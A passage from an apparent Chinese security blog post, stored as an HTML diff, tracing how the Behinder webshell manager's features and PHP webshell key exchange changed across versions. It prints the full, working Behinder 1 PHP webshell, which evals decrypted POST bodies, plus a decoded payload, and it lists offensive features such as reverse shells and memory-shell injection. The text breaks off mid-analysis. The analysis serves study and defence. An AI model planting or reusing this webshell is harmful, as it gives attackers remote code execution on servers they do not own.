@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"c4ooc0.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.13.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="冰蝎，著名的加密流量 webshell 管理工具，刚好前几天冰蝎出 4.0 版啦，谨以此文简单回顾一下这些年冰蝎功能进化与密钥交换方面的变化。功能是一个工具非常重要的部分，密钥交换体现了冰蝎马连接方式上的变化，小聊一下这两个个人认为比较重要的方面。 本文主要关注 PHP 马，PHP 马传输的 payload 解开直接就是明文源码，比 JSP、ASP 好分析一些。因为 PHP 并不存在手动编译的过程">
+<meta property="og:type" content="article">
+<meta property="og:title" content="冰蝎演化史——以php马为例">
+<meta property="og:url" content="https://c4ooc0.github.io/2022/08/23/%E5%86%B0%E8%9D%8E%E6%BC%94%E5%8C%96%E5%8F%B2%E2%80%94%E2%80%94%E4%BB%A5php%E9%A9%AC%E4%B8%BA%E4%BE%8B/index.html">
+<meta property="og:site_name" content="c4ooc0个人博客">
+<meta property="og:description" content="冰蝎，著名的加密流量 webshell 管理工具，刚好前几天冰蝎出 4.0 版啦，谨以此文简单回顾一下这些年冰蝎功能进化与密钥交换方面的变化。功能是一个工具非常重要的部分，密钥交换体现了冰蝎马连接方式上的变化，小聊一下这两个个人认为比较重要的方面。 本文主要关注 PHP 马，PHP 马传输的 payload 解开直接就是明文源码，比 JSP、ASP 好分析一些。因为 PHP 并不存在手动编译的过程">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fo5xa_1EkDEvf5BkqF_XyIzXmJTp.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fu_dvr9ywJ3NuZ2w7-D1OCZ_KxOB.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FiLXrLR9sTIfGp1cHK-CY6Zw6uh_.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FtmAHvEaf6cABdMUsSnAXfXITZS-.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Ft4bnVJJtxQ6kErCKsLeFTbAQMCR.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fou8RV5u8IC0kyYkuvtQtUo6FHzI.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fu0ltOdco3qU_W_RccPBhJ_T_bzR.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Ft6mzNQcwOvTAdNHg6lH8vPEQdQz.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fg5TALp7S6xmw01TTMyl2uamn_ci.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fp2UxRXmqy9DUn42YOP1RZXDRQTs.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FnZm4jwvMztKVtm55kWQhWyPfIwD.png">
+<meta property="article:published_time" content="2022-08-23T08:07:53.000Z">
+<meta property="article:modified_time" content="2022-11-10T08:10:16.614Z">
+<meta property="article:author" content="c4ooc0">
+<meta property="article:tag" content="安全 瞎折腾">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fo5xa_1EkDEvf5BkqF_XyIzXmJTp.png">
+
+
+<link rel="canonical" href="https://c4ooc0.github.io/2022/08/23/%E5%86%B0%E8%9D%8E%E6%BC%94%E5%8C%96%E5%8F%B2%E2%80%94%E2%80%94%E4%BB%A5php%E9%A9%AC%E4%B8%BA%E4%BE%8B/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://c4ooc0.github.io/2022/08/23/%E5%86%B0%E8%9D%8E%E6%BC%94%E5%8C%96%E5%8F%B2%E2%80%94%E2%80%94%E4%BB%A5php%E9%A9%AC%E4%B8%BA%E4%BE%8B/","path":"2022/08/23/冰蝎演化史——以php马为例/","title":"冰蝎演化史——以php马为例"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>冰蝎演化史——以php马为例 | c4ooc0个人博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">c4ooc0个人博客</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">半吊子的安全工程师，ACG爱好者</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8A%9F%E8%83%BD%E6%94%B9%E8%BF%9B"><span class="nav-number">1.</span> <span class="nav-text"> 功能改进</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2"><span class="nav-number">2.</span> <span class="nav-text"> 密钥交换</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%B0%E8%9D%8E-1-%E4%B8%80%E6%AC%A1-get%E5%8D%8F%E5%95%86%E5%AF%86%E9%92%A5"><span class="nav-number">2.1.</span> <span class="nav-text"> 冰蝎 1 一次 GET，协商密钥</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%B0%E8%9D%8E-2-%E5%A4%9A%E6%AC%A1-get%E5%8F%AF%E5%8F%98%E8%BD%BD%E8%8D%B7"><span class="nav-number">2.2.</span> <span class="nav-text"> 冰蝎 2 多次 GET，可变载荷</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%B0%E8%9D%8E-3-%E9%A2%84%E5%85%B1%E4%BA%AB%E5%AF%86%E9%92%A5%E6%97%A0%E6%98%8E%E6%96%87%E4%BA%A4%E4%BA%92"><span class="nav-number">2.3.</span> <span class="nav-text"> 冰蝎 3 预共享密钥，无明文交互</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%B0%E8%9D%8E-4-%E5%AF%86%E9%92%A5%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC"><span class="nav-number">2.4.</span> <span class="nav-text"> 冰蝎 4 密钥写入木马</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9C%80%E5%90%8E"><span class="nav-number">3.</span> <span class="nav-text"> 最后</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">c4ooc0</p>
+  <div class="site-description" itemprop="description">永怀谦卑与求知欲</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/c4ooc0" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;c4ooc0" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.yuque.com/choocolate-yqwd/blog" title="语雀 → https:&#x2F;&#x2F;www.yuque.com&#x2F;choocolate-yqwd&#x2F;blog" rel="noopener" target="_blank">语雀</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      友友们
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://macshuo.com/" title="http:&#x2F;&#x2F;macshuo.com&#x2F;" rel="noopener" target="_blank">testLink</a>
+        </li>
+    </ul>
+  </div>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://c4ooc0.github.io/2022/08/23/%E5%86%B0%E8%9D%8E%E6%BC%94%E5%8C%96%E5%8F%B2%E2%80%94%E2%80%94%E4%BB%A5php%E9%A9%AC%E4%B8%BA%E4%BE%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="c4ooc0">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="c4ooc0个人博客">
+      <meta itemprop="description" content="永怀谦卑与求知欲">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="冰蝎演化史——以php马为例 | c4ooc0个人博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          冰蝎演化史——以php马为例
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-08-23 16:07:53" itemprop="dateCreated datePublished" datetime="2022-08-23T16:07:53+08:00">2022-08-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-11-10 16:10:16" itemprop="dateModified" datetime="2022-11-10T16:10:16+08:00">2022-11-10</time>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>3.3k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>12 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>冰蝎，著名的加密流量 webshell 管理工具，刚好前几天冰蝎出 4.0 版啦，谨以此文简单回顾一下这些年冰蝎功能进化与密钥交换方面的变化。功能是一个工具非常重要的部分，密钥交换体现了冰蝎马连接方式上的变化，小聊一下这两个个人认为比较重要的方面。
+本文主要关注 PHP 马，PHP 马传输的 payload 解开直接就是明文源码，比 JSP、ASP 好分析一些。因为 PHP 并不存在手动编译的过程，只要提供 PHP 源代码，然后 PHP 会自己把源代码编译为 opcode，由 Zend 引擎来解析 opcode。而冰蝎对于 java <a target="_blank" rel="noopener" href="http://xn--0tr.NET">和.NET</a> 的支持都是传输加密之后的二进制字节流，java 环境传输 class 二进制文件，.NET 环境传输 dll 文件的二进制字节流，想要看到 payload 源码，还需反编译过程，稍微复杂一些。</p>
+<h1 id="功能改进"><a class="markdownIt-Anchor" href="#功能改进"></a> 功能改进</h1>
+<p>作为工具的使用者，最关注的还是冰蝎功能的提升。而一个基本的 webshell 管理工具，以经典的菜刀为例，需要具有获取基本信息、命令执行、文件管理等基础功能，还有数据库管理、执行脚本等拓展功能。
+而脍炙人口的冰蝎当然不会止步于此，从冰蝎 1 开始，作者根据其丰富经验，就内置了九大功能：获取基本信息、文件管理、命令执行、虚拟终端、Socks 代理、反弹 Shell、数据库可视化管理、自定义代码执行和备忘录功能。其中除了 webshell 管理工具的常规功能外，针对内网环境，冰蝎 1 就可以做到自动上传并加载数据库驱动、反弹 Meterpreter、基于一句话木马的 Socks 代理功能等强大功能。
+<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fo5xa_1EkDEvf5BkqF_XyIzXmJTp.png" alt="" />
+从反编译的源码来看，冰蝎 2 时作者已有内置插件的想法，但还没完善。除此之外，冰蝎从 2.0 版本开始还有一些细节方面的改善，开始支持自定义请求头、自定义 cookie、http 代理，虚拟终端 shell 进程可关闭等，从渗透角度绝对是更隐蔽了。
+<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fu_dvr9ywJ3NuZ2w7-D1OCZ_KxOB.png" alt="" />
+不久后推出的冰蝎 3 就拥有了插件扩展，ui 里可以看到支持在线安装，请求了一下发现返回是 null，可能当时不同功能的插件还有待开发吧。冰蝎 3 能够在 github 上找到的 release 都是 beta 版，界面中所提到 v3 正式版上线的“平行空间”功能都没有实现。不过冰蝎 3 多了 socks 代理连接、增强了内网穿透功能、在原有的基于 HTTP 的 socks5 隧道基础上，增加了单端口转发功能，可一键将内网端口映射至 VPS 或者本机端口、请求体增加了随机冗余参数、提升了客户端运行环境的兼容性、增加内存马防检测功能、Java 内存马注入功能、增加 CobaltStrike 一键上线、增强 shell 管理等等。
+<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FiLXrLR9sTIfGp1cHK-CY6Zw6uh_.png" alt="" />
+冰蝎 4 实现了“平行空间”功能，也就是内网资产探测和管理，本地环境简单尝试了一下，发现这个功能提升空间还是很大的。其他细节方面，冰蝎 4 增强了文件管理、连接逻辑重构、新增 Agent 内存马一键注入、多层网络子 Shell 穿透模块、自动缓存数据等功能。最重要的是，开放插件开发模块，可由使用者自己开发自定义插件，内置了多款插件，冰蝎生命力更进一步。
+<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FtmAHvEaf6cABdMUsSnAXfXITZS-.png" alt="" /></p>
+<h1 id="密钥交换"><a class="markdownIt-Anchor" href="#密钥交换"></a> 密钥交换</h1>
+<h2 id="冰蝎-1-一次-get协商密钥"><a class="markdownIt-Anchor" href="#冰蝎-1-一次-get协商密钥"></a> 冰蝎 1 一次 GET，协商密钥</h2>
+<p>首先分析一下冰蝎 PHP 马：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$key</span>=<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">rand</span>())),<span class="number">16</span>);</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">	<span class="keyword">print</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$key</span>=<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line">	<span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">		<span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">			<span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">	<span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">	<span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">	@<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>冰蝎 1 新增 shell 需要参数密码：
+<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Ft4bnVJJtxQ6kErCKsLeFTbAQMCR.png" alt="" />
+这里的密码并非会话密钥，只是 GET 请求 URL 的参数。
+如果收到的是 GET 请求，则生成随机 16 位密钥，并将密钥写入 session，返回密钥明文。
+如果收到的是 POST 请求，就从 session 中取出密钥，函数 file_get_contents(&quot;PHP://input&quot;)获取 POST 请求体的内容，对其进行 base64 解码之后，在进行 AES 解密，执行解密结果：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">assert|<span class="keyword">eval</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;QGVycm9yX3JlcG9ydGluZygwKTsNCmZ1bmN0aW9uIG1haW4oJGNvbnRlbnQpDQp7DQoJJHJlc3VsdCA9IGFycmF5KCk7DQoJJHJlc3VsdFsic3RhdHVzIl0gPSBiYXNlNjRfZW5jb2RlKCJzdWNjZXNzIik7DQogICAgJHJlc3VsdFsibXNnIl0gPSBiYXNlNjRfZW5jb2RlKCRjb250ZW50KTsNCiAgICAka2V5ID0gJF9TRVNTSU9OWydrJ107DQogICAgZWNobyBlbmNyeXB0KGpzb25fZW5jb2RlKCRyZXN1bHQpLCRrZXkpOw0KfQ0KDQpmdW5jdGlvbiBlbmNyeXB0KCRkYXRhLCRrZXkpDQp7DQoJaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkNCiAgICAJew0KICAgIAkJZm9yKCRpPTA7JGk8c3RybGVuKCRkYXRhKTskaSsrKSB7DQogICAgCQkJICRkYXRhWyRpXSA9ICRkYXRhWyRpXV4ka2V5WyRpKzEmMTVdOyANCiAgICAJCQl9DQoJCQlyZXR1cm4gJGRhdGE7DQogICAgCX0NCiAgICBlbHNlDQogICAgCXsNCiAgICAJCXJldHVybiBvcGVuc3NsX2VuY3J5cHQoJGRhdGEsICJBRVMxMjgiLCAka2V5KTsNCiAgICAJfQ0KfSRjb250ZW50PSJlODAzYTkzYi02N2VhLTQ3ZWQtYjBiMC03NWQxNGNmOTBiZDkiOw0KbWFpbigkY29udGVudCk7&#x27;</span>));</span><br><span class="line">base64解码后：</span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line">	<span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$content</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>),<span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="variable">$data</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">    			&#125;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">return</span> <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;<span class="variable">$content</span>=<span class="string">&quot;e803a93b-67ea-47ed-b0b0-75d14cf90bd9&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">main</span>(<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+<p>冰蝎 1 会以一次 GET 请求开始本次连接，本次 GET 请求的响应包 body 就是本次会话的 AES 使用的密钥，本次会话使用 AES/CBC/PKCS5Padding 加密，iv 是十六字节的 0x00 。GET 请求之后的第一个 POST 一般为请求基本信息，PHP 马就是请求 PHPinfo。
+<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fou8RV5u8IC0kyYkuvtQtUo6FHzI.png" alt="" /></p>
+<h2 id="冰蝎-2-多次-get可变载荷"><a class="markdownIt-Anchor" href="#冰蝎-2-多次-get可变载荷"></a> 冰蝎 2 多次 GET，可变载荷</h2>
+<p>冰蝎 2webshell 相较于冰蝎 1 并没有太多改变，但在建立连接方面，冰蝎 2 会以至少两次 GET 请求开启一次与 webshell 的连接。通过比较前后两次请求包 body 的内容确定前后附加的内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">11111payload22222</span><br><span class="line">11111another payload22222</span><br></pre></td></tr></table></figure>
+<p>本次连接的会话密钥以最后一个 GET 请求的相应包 body 为准。两次 GET 显然提升了冰蝎马的灵活性。
+建立连接时 GET 请求之后，还有一次 POST 请求，用于验证密钥，以下是该 POST 请求携带 payload 所执行的函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line">	<span class="variable">$result</span>[<span 